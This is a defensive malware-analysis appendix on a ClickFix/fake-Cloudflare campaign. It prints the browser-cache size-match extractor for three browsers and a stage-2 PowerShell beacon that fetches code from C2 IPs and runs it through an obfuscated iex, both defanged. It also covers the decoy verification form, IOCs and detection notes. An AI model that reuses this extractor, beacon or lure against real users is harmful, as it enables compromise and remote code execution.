# Appendix E — Frame-by-Frame: The `smilesofboca` ClickFix Chain

> **This appendix documents the actual on-screen artifacts** from John Hammond's
> *"My Browser Cache Got Infected,"* captured frame-by-frame (evidence in
> [`screenshots/video/`](screenshots/video/)). It is the **ClickFix / fake-Cloudflare**
> variant — the one narrated in [Chapter 1](chapter-01-the-infected-cache.md) — and it
> answers the two questions in the upload note: **what the payload is, and exactly how it
> was extracted from the cache.**
>
> **Attribution:** all frames are from John Hammond's video, reproduced here for defensive
> commentary and education. **Defanged:** IPs/paths/IDs are neutralized; the extractor and
> C2 code are annotated with execution disabled.

---

## E.1 The extraction, in one paragraph (the answer to the note)

The malicious page uses an `<img>`-style fetch to make the browser **cache a file that is
really a Windows batch script**, served so it lands in the browser's cache directory as a
`f_######` entry. That batch is **exactly 17,635 bytes**. The command the victim pastes does
not download anything — it **walks the browser cache looking for the one file whose size is
17,635 bytes**, copies that file to `%TEMP%\t.bat`, and runs it. *The file size is the
selector.* That's the whole trick: the "network request" delivered the payload earlier as a
cached image; the pasted line just finds it by size and executes it.

> In DevTools → **Network**, the payload shows up as a cached response (image content-type)
> whose body is the batch; on disk it's a `Cache_Data\f_######` entry of size **17635**.

---

## E.2 Frame 01 — the live lure

**File:** [`screenshots/video/01-lure-cloudflare-clickfix.png`](screenshots/video/01-lure-cloudflare-clickfix.png)

- **Compromised host:** `smilesofboca` — a legitimate **dentist's website** that was hacked
  to serve the lure (proof the victims land on trusted, real sites).
- **Overlay:** a fake **Cloudflare** "Verifying…" box: *"Let us know you're human, please
  complete steps:"*
  1. Press **Win + R** to open the verification dialog
  2. Press **Ctrl + V** to paste the confirmation code
  3. Press **Enter** to confirm you're not a robot
- **Ref ID (decoy):** `XHQT-RU5U-XW7X-3MUC-M4VC-L735-GDCQ-Q7RS-X4FN-PPPQ` — cosmetic, to
  look legitimate.

This is textbook **ClickFix**: the clipboard was silently loaded with the real command; the
victim is socially engineered into pasting it into the Run box.

## E.3 Frame 02 — the clipboard command (the extractor)

**File:** [`screenshots/video/02-clipboard-size-match-extractor.png`](screenshots/video/02-clipboard-size-match-extractor.png)
(shown in Sublime Text — the "sublime code file" from the note).

The pasted one-liner exists in three browser-specific forms. **Annotated & neutralized:**

```bat
:: Firefox
cmd /c for /r "%LOCALAPPDATA%\Mozilla\Firefox\Profiles" %f in (f_*) do ^
   @if %~zf==17635 copy "%f" %TEMP%\t.bat >nul 2>nul && REM %TEMP%\t.bat   <-- exec REDACTED

:: Chrome
cmd /c for /r "%LOCALAPPDATA%\Google\Chrome\User Data" %f in (f_*) do ^
   @if %~zf==17635 copy "%f" %TEMP%\t.bat >nul 2>nul && REM %TEMP%\t.bat   <-- exec REDACTED

:: Brave
cmd /c for /r "%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data" %f in (f_*) do ^
   @if %~zf==17635 copy "%f" %TEMP%\t.bat >nul 2>nul && REM %TEMP%\t.bat   <-- exec REDACTED
```

**How it works, step by step:**
| Token | Meaning |
|-------|---------|
| `for /r "<cache root>" %f in (f_*)` | recursively enumerate every `f_######` cache entry |
| `%~zf` | the **size in bytes** of the current file `%f` |
| `@if %~zf==17635` | select **only** the file whose size is exactly **17,635 bytes** — the seeded batch |
| `copy "%f" %TEMP%\t.bat` | copy that cache blob out to a runnable `.bat` |
| `&& %TEMP%\t.bat` | **execute it** (disabled above as `REM … <-- exec REDACTED`) |

> **Why size, not a marker?** The DOUBLECUP-era chains ([Ch.4](chapter-04-the-marketplace.md))
> and this campaign both locate the payload **by exact file size** — no download, no marker
> string needed. It's the cleanest possible carve: the cache already holds the file; you just
> pick it out by its length.

**Detection:** `cmd.exe`/`for` enumerating `f_*` under a browser cache root with a hard-coded
`%~zf==<size>` test, spawned from `explorer.exe`, writing `%TEMP%\t.bat`. See
[Appendix B](appendix-b-detection.md) R1–R3.

## E.4 Frame 03 — stage 2: the C2 beacon (`f_00000d` → `stage2.ps1`)

**File:** [`screenshots/video/03-stage2-c2-beacon.png`](screenshots/video/03-stage2-c2-beacon.png)

The `t.bat` decodes to `f_00000d`, which launches PowerShell. Key logic (defanged):

```powershell
if ((Get-Random -Minimum 0 -Maximum 2) -eq 0) {
   $PArgs   = @('-NoP','-ep','b','-Command','$p = irm 45.39.216[.]46/velcap3b; .(get-alias *ex) $p')
   $PArgsFB = @('-NoP','-ep','b','-Command','$p = irm 45.39.216[.]46/velcap3b; .(get-alias *ex) $p')
} else {
   $PArgs   = @('-NoP','-ep','b','-Command','$p = irm 45.39.216[.]46/velcap3d; .(get-alias *ex) $p')
   $PArgsFB = @('-NoP','-ep','b','-Command','$p = irm 45.25.77[.]550/velcap3d; .(get-alias *ex) $p')  # fallback host
}
$PSExe = $env:windir + '\System32\WindowsPowerShell\v1.0\powershell.exe'
try   { Start-Process -FilePath $PSExe -ArgumentList $PArgs   -WindowStyle h -PassThru }
catch { Start-Process -FilePath $PSExe -ArgumentList $PArgsFB -WindowStyle h -PassThru }  # fallback
```

**Tradecraft on display:**
- `irm` = `Invoke-RestMethod`; `.(get-alias *ex) $p` resolves to **`iex`** (Invoke-Expression)
  via alias lookup — a string-free way to run the fetched code.
- **Randomized C2** (`velcap3b` / `velcap3d`) with a **fallback host** if the primary throws.
- `-NoP -ep b -WindowStyle h` = NoProfile, ExecutionPolicy Bypass, Hidden window.

**Defanged IOCs:** `hxxp://45.39.216[.]46/velcap3b`, `…/velcap3d`, fallback `45.25.77[.]550`.
*(IPs transcribed from the frame and neutralized; validate before use.)*

## E.5 Frames 04–12 — the fake Cloudflare form, rendered in PowerShell

**Files:** [`04-fake-cf-form-init`](screenshots/video/04-fake-cf-form-init.png) …
[`12-fake-cf-verification-complete`](screenshots/video/12-fake-cf-verification-complete.png)

While stage 2 runs, the script **draws a convincing Cloudflare challenge as a native
WinForms window** to keep the victim calm and hide the real activity:

- `$form.Text = 'Cloudflare Security Challenge'`, fixed-dialog, centered, no maximize.
- Fake identifiers: `$nodeId = "CDN-<rand100..999>-<rand10..99>"`; `$rayId` derived from a
  `[guid]` (formatted like a real Cloudflare ray ID).
- A **checklist** animated row-by-row (frame 07):
  `TLS Handshake→connect`, `Edge Routing→resolve`, `Browser Integrity→analyze`,
  `Bot Detection→evaluate`, `Request Signature→verify`, `Token Exchange→sign`.
- A progress bar with stage labels (frame 11):
  `connecting → handshake → verifying → signing → finalizing → done`.
- Ends: `$lblStatus.Text = 'Verification successful'`, `"✔ Verification complete"`,
  `$lblRay.Text = "ray $rayId"`, button flips to **OK**, then
  `[Windows.Forms.Application]::Run($form)` (frame 12).

> **The point of the theatre:** the victim believes they're watching a real Cloudflare check
> pass. There is no server behind it — every "check" is a `Start-Sleep` and a redraw. It buys
> time and trust while the real payload beacons out (E.4).

## E.6 Consolidated IOCs from the frames (defanged)

| # | Indicator | Type | Frame |
|---|-----------|------|-------|
| 1 | `smilesofboca` (compromised legit site) | host | 01 |
| 2 | Cloudflare "Verifying… Win+R / Ctrl+V / Enter" overlay | lure | 01 |
| 3 | Ref ID `XHQT-RU5U-…-PPPQ` (decoy) | string | 01 |
| 4 | `for /r … (f_*) … %~zf==17635 copy … t.bat` | cmdline | 02 |
| 5 | Cache payload size **17635 bytes** | selector | 02 |
| 6 | `%TEMP%\t.bat` staging | path | 02 |
| 7 | `f_00000d` → `stage2.ps1` | file | 03 |
| 8 | `hxxp://45.39.216[.]46/velcap3b`, `/velcap3d` | C2 | 03 |
| 9 | fallback `45.25.77[.]550/velcap3d` | C2 | 03 |
| 10 | `irm … ; .(get-alias *ex) $p` (obfuscated `iex`) | technique | 03 |
| 11 | WinForms "Cloudflare Security Challenge" decoy | payload | 04–12 |

## E.7 Where this fits

This is the **file-level companion to [Chapter 1](chapter-01-the-infected-cache.md)** and the
sibling of [Appendix C](appendix-c-the-files.md): Appendix C documents the **FileFix/Fortinet**
variant (Expel), this appendix documents the **ClickFix/Cloudflare** variant (the video).
Same engine — cache smuggling, located by size — different lure and staging:

| | Appendix C (FileFix/Fortinet) | **Appendix E (ClickFix/Cloudflare)** |
|---|---|---|
| Lure | FortiClient VPN compliance | Cloudflare "Verifying…" on `smilesofboca` |
| Manual step | Explorer address bar | `Win+R` Run dialog |
| Locate payload by | marker strings `bTgQcBpv`/`mX6o0lBw` | **exact file size `%~zf==17635`** |
| Stage lang | `headless powershell` → ZIP | `t.bat` → `stage2.ps1` (`irm`+`iex`) |
| Decoy | — | full PowerShell-rendered Cloudflare form |

## E.7b Watch it work (benign sandbox run)

The size-match extraction was **reproduced and run** in the sandbox, benignly — see
[`lab/RUN-size-match.md`](lab/RUN-size-match.md) and the captured output
[`screenshots/06-lab-size-match-carve.png`](screenshots/06-lab-size-match-carve.png). It
seeds a fake cache (with off-by-one decoys at 17,634 / 17,636 bytes) and shows the carve
selecting **only** the exact 17,635-byte file — no download, no network, no execution.

> The next step (`stage2.ps1` → `irm <C2>; iex`) is **not** run: that fetches and executes
> live attacker code. E.3–E.4 document it statically instead.

## E.8 Password-protected sample

The extracted code above is also bundled as a **password-protected ZIP** for safe storage
(so it can't be opened or run by accident):

- File: [`samples/payload-void.zip`](samples/payload-void.zip) · **password: `void`**
- Contents: `payload.txt` (lure + extractor + stage-2 beacon + decoy, defanged) + a warning readme.
- See [`samples/README.md`](samples/README.md).

The content stays defanged (C2s `[.]`-neutralized, execution disabled) as a second layer —
the weak password only prevents *accidental* access; the neutralization is the real safety.

---

*Sources:* John Hammond's video (frames); technique lineage in [sources.md](sources.md).
